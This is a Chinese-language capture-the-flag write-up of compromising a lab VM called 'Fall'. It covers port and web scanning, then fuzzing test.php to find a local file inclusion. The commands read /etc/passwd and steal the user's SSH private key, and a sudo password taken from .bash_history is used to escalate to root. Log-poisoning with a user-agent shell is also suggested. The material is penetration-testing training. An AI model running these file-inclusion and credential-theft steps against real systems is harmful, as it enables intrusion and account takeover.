# 信息搜集

1、端口探测

```bash
└─# nmap -A -sVC -O -p- 192.168.2.14 -oA nmap.txt
```

```
PORT      STATE  SERVICE     VERSION
22/tcp    open   ssh         OpenSSH 7.8 (protocol 2.0)
| ssh-hostkey: 
|   2048 c586f96427a4385b8a11f9444b2aff65 (RSA)
|   256 e1000bcc5921696c1ac17722395a354f (ECDSA)
|_  256 1d4e146d20f456da65836f7d339df0ed (ED25519)
80/tcp    open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Good Tech Inc's Fall Sales - Home
111/tcp   closed rpcbind
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp   open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2019-08-15T03:51:33
|_Not valid after:  2020-08-19T05:31:33
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
|_http-title: Good Tech Inc's Fall Sales - Home
|_http-generator: CMS Made Simple - Copyright (C) 2004-2021. All rights reserved.
| http-robots.txt: 1 disallowed entry 
|_/
445/tcp   open   netbios-ssn Samba smbd 4.8.10 (workgroup: SAMBA)
3306/tcp  open   mysql       MySQL (unauthorized)
8000/tcp  closed http-alt
8080/tcp  closed http-proxy
8443/tcp  closed https-alt
9090/tcp  open   http        Cockpit web service 162 - 188
|_http-title: Did not follow redirect to https://192.168.2.14:9090/
10080/tcp closed amanda
10443/tcp closed cirrossp
MAC Address: 00:0C:29:2C:1D:53 (VMware)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.4
Network Distance: 1 hop
Service Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.8.10)
|   Computer name: fall
|   NetBIOS computer name: FALL\x00
|   Domain name: \x00
|   FQDN: fall
|_  System time: 2023-07-31T19:32:11-07:00
|_clock-skew: mean: 2h19m59s, deviation: 4h02m29s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-01T02:32:14
|_  start_date: N/A
```

2、80端口简单探测

```bash
└─# nikto -host 192.168.2.14
```

```
---------------------------------------------------------------------------
+ Server: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3
+ /: Retrieved x-powered-by header: PHP/7.2.18.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie CMSSESSID19a99af5f4a4 created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /robots.txt: contains 2 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.39 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/1.1.0i-fips appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ Perl/v5.26.3 appears to be outdated (current is at least v5.32.1).
+ mod_perl/2.0.10 appears to be outdated (current is at least 2.0.11).
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995
+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678
+ /lib/: This might be interesting.
+ /tmp/: Directory indexing found.
+ /tmp/: This might be interesting.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/login.php: Admin login page/section found.
+ /test.php: This might be interesting.
+ 9715 requests: 0 error(s) and 21 item(s) reported on remote host
+ End Time:           2023-07-31 22:34:36 (GMT-4) (43 seconds)
---------------------------------------------------------------------------
```

发现了一些目录

3、80端口web目录探测

```bash
└─# gobuster dir -u http://192.168.2.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
```

```
/index.php            (Status: 200) [Size: 8331]
/modules              (Status: 301) [Size: 236] [--> http://192.168.2.14/modules/]
/uploads              (Status: 301) [Size: 236] [--> http://192.168.2.14/uploads/]
/doc                  (Status: 301) [Size: 232] [--> http://192.168.2.14/doc/]
/admin                (Status: 301) [Size: 234] [--> http://192.168.2.14/admin/]
/assets               (Status: 301) [Size: 235] [--> http://192.168.2.14/assets/]
/test.php             (Status: 200) [Size: 80]
/lib                  (Status: 301) [Size: 232] [--> http://192.168.2.14/lib/]
/config.php           (Status: 200) [Size: 0]
/robots.txt           (Status: 200) [Size: 79]
/error.html           (Status: 200) [Size: 80]
/tmp                  (Status: 301) [Size: 232] [--> http://192.168.2.14/tmp/]
/missing.html         (Status: 200) [Size: 168]
```

# web打点

## FUZZ文件包含

1、搜索已知 cms 版本漏洞

```bash
└─# searchsploit CMS Made Simple 2.2.15
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                | php/webapps/49793.txt
CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                               | php/webapps/49345.txt
CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                   | php/webapps/49199.txt
```

需要权限的 RCE ，先放放留作后手

2、访问 test.php ，显示缺少参数

<img src=".\图片\Snipaste_2023-08-01_10-39-18.png" alt="Snipaste_2023-08-01_10-39-18" style="zoom:80%;" />

这时候就直接 fuzz

3、fuzz 大法试试文件包含

```bash
└─# ffuf -u "http://192.168.2.14/test.php?FUZZ=/etc/passwd" -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 80 -o fuzz.output
```

这里找到了

```http
http://192.168.2.14/test.php?file=/etc/passwd
```

<img src=".\图片\Snipaste_2023-08-01_10-49-52.png" alt="Snipaste_2023-08-01_10-49-52" style="zoom:67%;" />

4、fuzz 大法包含linux常见文件

这里可以用 burp 爆破，常见字典为

```
/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
```

5、这里先停下来思考一下，我们找到了一个文件包含漏洞，该包含读取 linux 下哪些重要文件呢？哪些又与权限挂钩呢？

- 因为之前在 /etc/passwd 里找到了一个有家的用户，可以查看该用户文件夹内的重要信息

```bash
└─# curl http://192.168.2.14/test.php?file=/etc/passwd | grep home                                           
qiu:x:1000:1000:qiu:/home/qiu:/bin/bash
```

比如历史记录、.ssh 下的公私钥等等

- 包含 apache 的日志文件，在 ua 头 里写 shell
- 包含网站配置文件，查看相关密码

## 包含私钥ssh登录

1、紧接上文，试试包含 `/home/qiu/.ssh/authorized_keys`  ，看看目标开启了公私钥访问没

```bash
└─# curl http://192.168.2.14/test.php?file=/home/qiu/.ssh/authorized_keys  
```

显示存在信息

2、包含 私钥 `id_rsa`

```bash
curl http://192.168.2.14/test.php?file=/home/qiu/.ssh/id_rsa
```

```bash
└─# curl http://192.168.2.14/test.php?file=/home/qiu/.ssh/id_rsa > id_rsa
```

3、私钥登录 qiu 用户

改权限登录

```
└─# chmod 0400 id_rsa 
└─# ssh qiu@192.168.2.14 -i id_rsa 
```

得到低权限 flag

```bash
[qiu@FALL ~]$ cat local.txt 
A low privilege shell! :-)
```

# 提权

二次信息搜集

1、查看到网站配置文件

```bash
[qiu@FALL html]$ cat config.php 
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = '127.0.0.1';
$config['db_username'] = 'cms_user';
$config['db_password'] = 'P@ssw0rdINSANITY';
$config['db_name'] = 'cms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Asia/Singapore';
$config['db_port'] = 3306;
?>
```

1、查看 qiu 用户 历史命令

```bash
[qiu@FALL ~]$ cat .bash_history 
ls -al
cat .bash_history 
rm .bash_history
echo "remarkablyawesomE" | sudo -S dnf update
ifconfig
ping www.google.com
ps -aux
ps -ef | grep apache
env
env > env.txt
rm env.txt
lsof -i tcp:445
lsof -i tcp:80
ps -ef
lsof -p 1930
lsof -p 2160
rm .bash_history
exit
ls -al
cat .bash_history
exit
```

以下的命令是直接 以 sudo 权限运行了命令

```
echo "remarkablyawesomE" | sudo -S dnf update
```

我们可以尝试下

```bash
[qiu@FALL ~]$ echo "remarkablyawesomE" | sudo -S id
[sudo] password for qiu: uid=0(root) gid=0(root) groups=0(root)
```

于是直接可以提权

```bash
[qiu@FALL ~]$ sudo su
[root@FALL qiu]# id
uid=0(root) gid=0(root) groups=0(root)
```

# 总结

关于 fuzz 大法有了新的操作与理解

可以 fuzz 文件包含 或者常见的恶意 payload

找文件包含漏洞时要善于利用，查看 linux 的重要文件信息，或者找个能上传图片马的地方，或者试试 日志包含ua头写shell

留心用户的 历史命令记录


